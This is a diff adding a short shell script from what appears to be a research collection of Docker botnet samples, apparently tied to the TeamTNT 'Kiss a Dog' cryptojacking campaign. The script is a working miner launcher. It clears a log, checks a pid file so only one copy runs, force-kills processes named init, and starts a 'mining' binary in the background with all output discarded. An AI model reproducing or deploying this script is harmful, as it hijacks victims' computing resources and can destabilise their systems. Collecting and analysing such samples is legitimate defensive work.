@@ -1,0 +1,14 @@
+#!/bin/sh
+> /workspaces/Docker-Botnets/teamtnt_kiss_a_dog/xm_miner/logs
+/workspaces/Docker-Botnets/teamtnt_kiss_a_dog/xm_miner/init.d
+chmod 755 *
+if test -r /workspaces/Docker-Botnets/teamtnt_kiss_a_dog/xm_miner/ra.pid; then
+pid=$(cat /workspaces/Docker-Botnets/teamtnt_kiss_a_dog/xm_miner/ra.pid)
+if $(kill -CHLD $pid >/dev/null 2>&1)
+then
+exit 0
+fi
+fi
+pkill -9 init
+cd /workspaces/Docker-Botnets/teamtnt_kiss_a_dog/xm_miner
+./mining &>/dev/null
